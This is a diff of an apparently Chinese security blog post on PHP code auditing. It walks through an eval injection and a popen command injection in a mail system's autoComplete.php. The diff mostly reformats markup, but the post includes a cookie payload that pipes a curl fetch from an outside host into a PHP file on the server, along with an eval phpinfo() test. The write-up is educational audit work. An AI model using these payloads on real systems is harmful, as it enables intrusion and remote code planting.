@@ -186,7 +186,7 @@
 <p>可以很直观看到<code>$tag_code</code>未经过危险字符的过滤就直接被<code>eval</code>执行了两次。</p>
 <p>直接赋值给<code>tag_code=phpinfo()</code>可以查看下当前网站的基本信息，我们可以结合<code>echo</code>命令来进一步达到命令执行的效果如下：</p>
 <p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g19okpcblsj30o60h7425.jpg" alt></p>
-<h2 id="0x03-popen案例"><a href="#0x03-popen案例" class="headerlink" title="0x03 popen案例"></a>0x03 popen案例</h2><p>漏洞详情</p>
+<h2 id="0x03-popen案例"><a href="#0x03-popen案例" class="headerlink" title="0x03 popen案例"></a>0x03 popen案例</h2><p>漏洞详情:</p>
 <p>某知名邮件系统就被审计出几处命令执行漏洞，其中<code>popen</code>函数引发的漏洞位于文件<code>/user/autoComplete.php</code></p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"USER"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment" spellcheck="true">//--验证cookie。</span>
@@ -241,11 +241,19 @@
 <p>我们注意到下面的代码</p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">"/var/*/sbin/hashid $uid $domain"</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里的<code>/var/*/sbin/hashid</code>是该邮件系统执行命令的，所以这里<code>uid</code>和<code>domain</code>均未进行过滤就直接执行了命令，导致任意命令执行漏洞。</p>
-<p>漏洞证明</p>
+<p>漏洞证明:</p>
 <p>访问</p>
-<pre><code>http://localhost/user/autoComplete.php</code></pre><p>时设置<code>cookie</code>为：</p>
-<pre><code>UID=1|curl http://**.**.**.**/test.txt&gt;&gt;testinfo.php</code></pre><p>此时会在程序的<code>user</code>目录下生成<code>testinfo.php</code>，我们再次访问</p>
-<pre><code>http://localhost/user/testinfo.php</code></pre><p>即可证明<code>popen</code>执行<code>curl</code>命令写入成功：</p>
+<blockquote>
+<p><a href="http://localhost/user/autoComplete.php" target="_blank" rel="noopener">http://localhost/user/autoComplete.php</a><br>时设置<code>cookie</code>为：</p>
+</blockquote>
+<blockquote>
+<p>UID=1|curl http://<strong>.</strong>.<strong>.</strong>/test.txt&gt;&gt;testinfo.php</p>
+</blockquote>
+<p>此时会在程序的<code>user</code>目录下生成<code>testinfo.php</code>，我们再次访问</p>
+<blockquote>
+<p><a href="http://localhost/user/testinfo.php" target="_blank" rel="noopener">http://localhost/user/testinfo.php</a></p>
+</blockquote>
+<p>即可证明<code>popen</code>执行<code>curl</code>命令写入成功：</p>
 <p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g19p19xxivj30sx0bd0t7.jpg" alt></p>
 </section>
     <!-- Tags START -->
